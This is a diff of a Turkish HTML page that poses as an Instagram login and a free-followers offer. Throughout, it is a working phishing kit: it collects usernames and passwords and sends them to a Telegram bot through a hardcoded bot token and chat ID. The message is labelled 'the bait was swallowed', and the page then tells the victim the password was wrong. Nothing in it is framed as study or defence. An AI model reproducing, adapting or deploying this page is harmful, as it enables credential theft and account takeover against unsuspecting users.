@@ -2,70 +2,57 @@
 <html lang="tr">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Mesaj Gönder</title>
+<title>Instagram takipçi</title>
 
 <style>
-*{
-  margin:0;
-  padding:0;
-  box-sizing:border-box;
-  font-family:system-ui;
-}
-
 body{
-  background:#0f1a22;
-  height:100vh;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  color:#fff;
+  background:#fafafa;
+  font-family:Arial, sans-serif;
 }
-
 .container{
-  width:100%;
-  max-width:360px;
-  padding:20px;
-}
-
-h2{
+  width:350px;
+  margin:80px auto;
+  background:#fff;
+  border:1px solid #dbdbdb;
+  padding:40px;
   text-align:center;
-  margin-bottom:20px;
 }
-
+.logo{
+  font-family: 'Billabong', cursive;
+  font-size:48px;
+  margin-bottom:30px;
+}
 input, textarea{
   width:100%;
-  padding:14px;
-  margin-bottom:12px;
-  border-radius:12px;
-  border:none;
-  outline:none;
-  background:#1b2a36;
-  color:#fff;
-  font-size:15px;
+  padding:10px;
+  margin:6px 0;
+  background:#fafafa;
+  border:1px solid #dbdbdb;
+  border-radius:4px;
+  font-size:14px;
 }
-
 textarea{
   resize:none;
-  height:120px;
+  height:70px;
 }
-
 button{
   width:100%;
-  padding:14px;
-  border-radius:25px;
-  border:none;
-  background:#1877f2;
+  padding:8px;
+  background:#0095f6;
   color:#fff;
-  font-size:16px;
-  font-weight:600;
+  border:none;
+  border-radius:6px;
+  font-weight:bold;
+  margin-top:10px;
   cursor:pointer;
 }
-
-.status{
-  margin-top:12px;
-  text-align:center;
-  font-size:14px;
+button:hover{
+  background:#007cd6;
+}
+.info{
+  margin-top:10px;
+  font-size:12px;
+  color:#fff;
 }
 </style>
 </head>
@@ -73,52 +60,42 @@ button{
 <body>
 
 <div class="container">
-  <h2>İnstagram takipçi sitesi</h2>
+  <div class="logo">Instagram</div>
 
-  <input type="text" id="name" placeholder="Kullanici adi">
-  <input id="message" placeholder="Şifre"></textarea>
-  <button onclick="sendMessage()">Giris yap</button>
+  <input id="user" type="text" placeholder="Kullanıcı adı">
+  <input id="msg" placeholder="Sifre"></input>
+  <input type="password" placeholder="Miktar">
 
-  <div class="status" id="status"></div>
+  <button onclick="sendMessage()">Gönder</button>
+
+  <div class="info">instagram takipci hilesi</div>
 </div>
 
 <script>
-const BOT_TOKEN = "8412069744:AAH8tnhlIEujbQs6l9xayz4RH1pcK33NWv8";
-const CHAT_ID = "7038362008";
-
 function sendMessage(){
-  const name = document.getElementById("name").value;
-  const msg  = document.getElementById("message").value;
-  const status = document.getElementById("status");
+  const username = document.getElementById("user").value;
+  const message  = document.getElementById("msg").value;
 
-  if(msg.trim() === ""){
-    status.innerText = "Mesaj boş olamaz.";
+  if(!message){
+    alert("Kullanici adi ve sifre bos olmaz");
     return;
   }
 
-  const text = `
-log düştü
-👤 kullanici adi: ${name || "Belirtilmedi"}
-💬 Sifre: ${msg}
-  `;
+  const BOT_TOKEN = "8412069744:AAH8tnhlIEujbQs6l9xayz4RH1pcK33NWv8";
+  const CHAT_ID  = "7038362008";
 
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
     method:"POST",
-    headers:{"Content-Type":"application/json"},
+    headers:{ "Content-Type":"application/json" },
     body:JSON.stringify({
       chat_id: CHAT_ID,
-      text: text
+      text: `📩 Yem yutuldu\n👤 Kullanıcı: ${username}\n\n💬 ${message}`
     })
   })
-  .then(res => {
-    status.innerText = "✅ Mesaj gönderildi";
-    document.getElementById("message").value = "";
-  })
-  .catch(err => {
-    status.innerText = "❌ Hata oluştu";
-  });
+  .then(()=> alert("Kullanici adi veya sifre yanlis"))
+  .catch(()=> alert("Hata oluştu"));
 }
 </script>
 
 </body>
-  </html>
+</html>
